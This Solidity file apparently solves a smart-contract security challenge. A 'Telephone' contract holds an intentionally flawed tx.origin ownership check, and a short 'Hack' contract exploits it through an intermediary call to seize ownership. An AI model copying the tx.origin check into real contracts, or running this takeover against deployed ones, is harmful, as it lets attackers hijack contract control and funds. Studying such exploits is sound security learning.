// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone { // owner creates telephone

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract Hack { // hacker changes the Telephone's owner by calling changeOwner() via Hack contract
    constructor(address _target) {
        // tx.origin = msg.sender
        // msg.sender = address(this)
        Telephone(_target).changeOwner(msg.sender); // 
    }
}